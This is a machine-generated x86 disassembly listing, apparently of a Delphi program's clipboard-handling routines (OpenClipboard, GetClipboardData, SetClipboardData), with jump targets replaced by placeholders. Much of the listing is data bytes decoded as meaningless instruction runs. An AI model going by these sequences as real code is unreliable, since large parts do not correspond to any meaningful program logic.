inc ebx
add [ eax ] dl
nop
inc ecx
add [ ecx + ebx * 2 + 0x43 ] ch
add al ah
push ebp
inc ebx
add al bh
push esp
inc ebx
add [ eax + 0x55 ] bl
inc ebx
add [ ebp + edx * 2 + 0x540a0043 ] al
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472616f
nop
fcom [ ebx + eax * 2 ]
pop es
or dl [ ebx + eax * 2 + 0x6c ]
imul esi [ eax + 0x62 ] 0x6472616f
lodsb [ esi ]
push esp
inc ebx
add [ ecx + 0x41 ] bh
pop es
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_435530
push [ fs : eax ]
mov [ fs : eax ] esp
call EmptyClipboard
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435537
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_435558
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
call CloseClipboard
cmp [ ebx + 0xc ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x8 ]
call sub_42215c
sub_435584
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
inc [ ebx + 0x4 ]
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebx + 0x8 ] eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
call OpenClipboard
test eax eax
jne r-xdata
push ebx
push sub_4359d8
call sub_4220a8
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] 0x1
mov [ ebx + 0xd ] 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
sub_4355e0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x8 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_435600
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
push 0x1
call GetClipboardData
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_435672
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_404038
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov edx eax
mov eax ebx
call sub_404230
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435679
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_435680
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_435722
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
call EnumClipboardFormats
mov ebx eax
test bx bx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov edx ebx
mov eax [ r-xdata ]
call sub_4279ec
test al al
je r-xdata
movzx eax bx
push eax
call EnumClipboardFormats
mov ebx eax
test bx bx
jne r-xdata
movzx eax bx
push eax
call GetClipboardData
mov esi eax
push 0x9
call GetClipboardData
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_4278fc
call sub_403b20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435730
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_435788
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x2
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
mov esi eax
push esi
mov ecx ebx
mov dx 0x2
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43578f
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_435798
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_4357ed
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x3
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
push eax
mov ecx ebx
mov dx 0x3
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4357f4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4357fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_435680
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_435730
jmp r-xdata
mov edx ebx
mov eax esi
call sub_419008
mov edx ebx
mov eax esi
call sub_435798
jmp r-xdata
pop esi
pop ebx
retn
sub_435864
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_4358d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43553c
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
call sub_4279c0
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4358e0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_4358e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_43595d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43553c
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435964
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_43596c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_435864
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_418f24
mov edx ebx
mov eax esi
call sub_4358e8
jmp r-xdata
pop esi
pop ebx
retn
sub_4359d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_435a02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435a07
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
je r-xdata
call sub_403a9c
mov ebx [ rw-data ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
jmp r-xdata
call sub_403af0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435a34
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418ef8
test bl bl
jle r-xdata
xor eax eax
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_435a68
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_435a99
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435aa0
retn
mov eax [ rw-data ]
call sub_4032a8
sub_435b34
cmp [ ebx + 0x43 ] bl
add [ ebx ] al
or eax 0x74754254
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
dec esp
popad
jns r-xdata
add [ eax + 0x73 ] ah
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
jne r-xdata
inc ebx
add al bh
mov bh 0x44
add ah bh
jae r-xdata
add al ch
xchg edx eax
inc ebp
add al bl
mov bh 0x44
add ah bl
jae r-xdata
inc esp
inc ebx
add [ eax ] dl
mov bh 0x44
add [ ebx + esi * 2 - 0x6d8fffbd ] ch
add ah ch
pop ss
inc ebp
add [ eax + 0x440044b8 ] cl
mov bh 0x44
add [ edx + edx * 4 - 0x6d3fffbb ] ch
inc ebp
add [ edi + esi * 4 + 0x44 ] bh
add [ eax + eax ] ah
add [ eax ] al
pop esp
jne r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx + ebx * 2 ] dh
inc ebx
add [ ebx ] cl
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
inc esp
add [ eax - 0x3e ] ah
inc esp
add [ eax - 0x27ffbb35 ] cl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
add [ eax - 0x4fffbb17 ] bh
fld [ eax + eax + 0x24 ]
pop [ ecx ]
mov al 0x79
inc ebx
add [ edi * 4 - 0x4377ffbc ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5d ] ch
inc ebx
add dl cl
pop ebp
inc ebx
add [ ecx + eax - 0x74b40000 ] al
inc esp
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi - 0x2327ffc0 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add ah bl
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcomp [ ebp + 0x43 ]
add [ ecx + edi * 4 ] cl
inc esp
add ah ch
mov eax 0xb92c0044
inc esp
add [ eax ] bl
mov eax 0x930c0044
inc ebp
add [ eax ] dl
xchg ebx eax
inc ebp
add [ eax + edi * 4 ] bh
inc esp
add [ ebp + esi * 4 + 0x54160044 ] ch
push ebx
jo r-xdata
add [ esp + ebx * 2 + 0x43 ] dh
push 0x7466654c
or al 0x62
insb
inc edi
insb
jns r-xdata
inc esp
inc esp
add [ edi + ecx * 4 ] ah
inc ecx
add [ eax + 0x1c004379 ] dh
mov ebp 0xbc880044
inc edx
jne r-xdata
push 0x68676952
je r-xdata
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ esp + esi * 2 ] bl
inc ebx
add [ eax - 0x28 ] cl
inc esp
add [ eax + ebx * 8 + 0x44 ] al
add [ ecx + ebx * 8 ] dl
inc esp
add [ eax - 0x3ffbb45 ] dl
retn 0x44
inc esp
je r-xdata
or eax 0x6c476c62
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
add [ esi + eax * 8 + 0x44 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
pop ebp
inc ebx
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x435cd890
add [ edx + esi + 0x40 ] bl
add [ eax + 0x3c004217 ] bh
jae r-xdata
push 0x74746f42
outsd
insd
pop es
inc edx
jne r-xdata
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add al 0x35
jns r-xdata
push 0xd706f54
bound ebp [ edi + eax * 2 + 0x6c ]
inc edx
add [ eax + 0x200044b7 ] dh
sbb [ edx ] al
pop esp
mov eax 0x17700044
je r-xdata
outsb
jae r-xdata
adc [ eax + 0x28 ] ch
pop ebx
inc ebx
add bl al
jmp sub_403a3c
rcl [ ebx + ebx * 2 + 0xa010043 ] 0x54
dec esi
jne r-xdata
inc edx
add [ eax + ebx ] al
inc edx
add [ eax + 0x18 ] bl
inc edx
add [ esi + esi * 4 + 0x73600044 ] bl
add [ eax + edi * 4 + 0x44 ] bl
add [ eax + 0x17 ] dh
inc edi
insb
jns r-xdata
push 0x10173
add [ eax ] al
add al 0x0
add [ eax ] al
lea eax [ eax ]
clc
pop ebx
inc ebx
sub_435d88
jmp r-xdata
call esp
jge r-xdata
inc edx
add ah dh
jge r-xdata
popad
add [ eax ] al
jmp [ eax + 0x3c0044bb ]
je r-xdata
add [ eax ] ch
jle r-xdata
ja r-xdata
outsb
nop
fcomp [ ebp + 0x43 ]
add [ edi ] al
or al 0x54
push ebx
add [ eax + 0x3000437e ] bl
jg r-xdata
inc esp
add [ ecx ] ah
add bh bh
mov al [ 0x3c0044bb ]
mov esp 0x44
add [ eax + 0x3 ] al
inc edx
jo r-xdata
add [ eax ] bh
jg r-xdata
add [ fs : eax ] al
jb r-xdata
add [ eax ] eax
insb
pop ecx
inc ecx
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ 0x6e410700 ] cl
je r-xdata
jne r-xdata
inc edx
add [ eax + 0x7f ] al
inc ebx
add [ edi + edi * 2 + 0x43 ] ah
add al bl
jg r-xdata
add [ edi ] al
inc ebx
imul ebp [ esi + 0x74 ] 0x40103c73
add [ eax + 0x1 ] ch
add bh bh
sbb [ ebp + 0x43 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ edi + 0x72 ]
outsd
jne r-xdata
add [ eax - 0x37 ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040015 ] al
outsd
outsb
je r-xdata
dec esp
ja r-xdata
add dh bh
cwde
leave
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000e ] al
or eax 0x6e410700
add eax [ eax ]
add [ eax ] al
outsb
fcomp [ ebx + eax * 2 ]
inc eax
mov [ eax + eax + 0x27 ] es
add [ edi ] al
inc edx
jne r-xdata
inc esp
add [ edi ] ah
add al dl
add [ ebx ] 0xe8
jpo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x47050016 ] al
insb
jns r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push eax
add [ eax ] al
cld
dec ecx
jl r-xdata
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
xor eax 0x7bf00042
inc ebx
add [ eax - 0x300ffff ] al
popad
jo r-xdata
add [ eax + ecx * 8 + 0x44 ] dh
add [ eax + ecx * 8 - 0x173fffbc ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070012 ] al
outsb
js r-xdata
add [ eax + eax ] dh
[ eax + 0x10044ed ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000f ] al
outsd
outsb
jae r-xdata
add bh bh
jo r-xdata
je r-xdata
add ah dl
jpo r-xdata
leave
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
push sub_435b34
jae r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ 0x70796c47 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
add al 0x46
insb
popad
je r-xdata
adc [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ edi ] bl
outsb
jae r-xdata
sbb al 0x0
adc [ edx + 0x41 ] dh
add ah bl
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
jo r-xdata
outsb
je r-xdata
[ edi * 2 + 0x10043 ]
add bh bh
sub al 0x7d
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ esi ] al
dec esp
popad
jns r-xdata
inc edx
add al dh
jpo r-xdata
sub eax [ edx ]
push 0x68ff0000
leave
inc esp
dec [ esp + edi * 2 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
add al 0x44
outsd
ja r-xdata
add bh bh
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ edx + 0x1 ] dh
add bh bh
sar [ ebp + 0x43 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
inc ecx
add [ eax ] dl
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4c65646f
js r-xdata
inc edx
insb
insb
add [ eax + eax ] bh
add dh bh
sar [ ebx + 0x10044 ] 0x0
inc ecx
add [ edx + edi * 2 ] dh
inc ebx
add ah dl
jpe r-xdata
add [ eax ] al
call [ edi + eax * 8 - 0x16bfffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0xb4656c62
pop edx
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
outsb
je r-xdata
add [ edx - 0x17010000 ] bl
leave
jne r-xdata
jge r-xdata
add ah bh
jpo r-xdata
push ebp
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
inc esp
add [ ecx ] al
add [ eax ] al
add ah cl
jpo r-xdata
add [ eax ] eax
inc [ ebp + edi * 2 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
outsb
add al 0x0
add [ eax ] al
pop ds
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
0xe8ff0000 0x44c9
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001e ] al
outsb
je r-xdata
inc esp
cmp al 0x10
inc eax
add [ ecx + eax ] bh
dec [ eax + 0x7d ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
add [ esp + edx * 2 ] cl
push ebx
jo r-xdata
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
popad
jb r-xdata
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
cdq
add [ eax ] al
inc esp
leave
inc esp
add [ ecx + ecx * 8 + 0x44 ] cl
add [ eax - 0x80000000 ] al
push ds
add [ eax ] cl
push ebx
dec ebp
outsd
jne r-xdata
add [ eax ] al
and [ edx ] 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
arpl [ ecx + 0x6e ] bp
add [ bx + si ] dl
inc eax
add [ eax + 0x1 ] bh
add bh bh
test [ ebp + 0x43 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ esi ] 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2865646f
les eax [ ebp ]
jl r-xdata
push esp
jb r-xdata
adc [ eax ] al
jne r-xdata
push 0x6948776f
outsb
je r-xdata
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax + eax ] cl
jne r-xdata
inc edx
inc ebx
add [ eax + 0x10000000 ] cl
nop
inc esp
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0x34f80040 ] al
inc eax
inc esp
outsd
ja r-xdata
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
insb
inc ebx
insb
outsb
je r-xdata
outsb
je r-xdata
imul ebp [ esi + 0x74 ] r-xdata
add bh bh
sub al 0xc8
inc esp
add [ ecx ] al
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
add [ eax ] al
and [ ebx ] 0x0
outsb
jae r-xdata
[ eax + 0x7d ]
add [ edi ] al
push ebx
jo r-xdata
add bh bh
push 0x100437d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ edi ] bl
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
inc eax
push 0x7473694c
nop
jl r-xdata
cmp [ ecx + 0x44 ] 0x0
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0b00
dec ebp
outsd
jne r-xdata
adc [ eax ] al
push edi
sar ah cl
dec [ ebx - 0x740f7426 ]
inc ebp
or [ eax + 0x33 ] dl
ror [ ebx + 0x3af6e8c6 ] cl
add al [ eax ]
push 0x68636143
push esp
inc edi
insb
jns r-xdata
inc eax
xor al [ eax ]
pop esp
xor al [ eax ]
shl [ ebx + eax * 2 ] 0xb
inc ebx
add [ edi ] al
or dl [ edi + eax * 2 + 0x6c ]
jns r-xdata
inc ebp
add al bl
mov al 0x45
add [ eax - 0x67ffba54 ] dl
adc eax [ edx ]
adc al [ fs : edx ]
test al 0x13
inc edx
add [ eax - 0x1bffbdec ] ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ esi + ebx * 4 ] bl
inc ebp
add [ eax + ebp * 4 + 0x4a6c0045 ] al
inc ebp
add [ ebp + esi * 4 - 0x49e7ffbb ] cl
inc ebp
add [ eax + 0xa00454b ] dh
push esp
inc edi
insb
jns r-xdata
movsb [ edi ] [ esi ]
arpl [ ebx ] ax
push eax
lodsd [ esi ]
dec ebp
outsd
jbe r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
dec [ ebx - 0x31d7f2d ]
je r-xdata
inc eax
arpl [ ebx ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x7473694c
sub [ edx + 0x43 ] ah
add [ eax + edx * 4 + 0xc0044 ] ch
pop es
inc edx
jne r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebx - 0x52afffbd ] ah
or [ ecx + 0x44 ] bh
add al ah
add [ eax ] al
jmp eax
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
out dx al
into
cld
outsb
inc edi
insb
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
arpl [ ebx ] ax
xor [ eax ] al
add [ eax ] al
mov al 0x10
inc eax
add al dh
je r-xdata
mov eax esi
call sub_459ebc
test bl bl
jle r-xdata
and dl 0xfc
push 0x5500408d
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ esi ] dl
inc ebx
add [ esp + edx * 2 ] cl
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x63 ] al
inc ebx
add [ eax ] dh
add [ eax ] al
add [ eax - 0xfffbff0 ] dh
outsb
jae r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_459e68
add esp 0xfffffff0
call sub_40360c
add al al
inc ebx
add [ ebx ] cl
add al ch
bound eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x843a623
add [ eax ] al
add [ eax - 0xfffbff0 ] dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
sub_436131
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070022 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
inc ebx
add [ eax + 0x10000000 ] cl
nop
inc esp
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0x34f80040 ] al
inc eax
inc esp
outsd
ja r-xdata
inc eax
push 0x7473694c
nop
jl r-xdata
cmp [ ecx + 0x44 ] 0x0
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0b00
dec ebp
outsd
jne r-xdata
sar ah cl
dec [ ebx - 0x740f7426 ]
inc ebp
or [ eax + 0x33 ] dl
ror [ ebx + 0x3af6e8c6 ] cl
add al [ eax ]
push 0x68636143
push esp
inc edi
insb
jns r-xdata
inc eax
xor al [ eax ]
pop esp
xor al [ eax ]
shl [ ebx + eax * 2 ] 0xb
inc ebx
add [ edi ] al
or dl [ edi + eax * 2 + 0x6c ]
jns r-xdata
inc ebp
add al bl
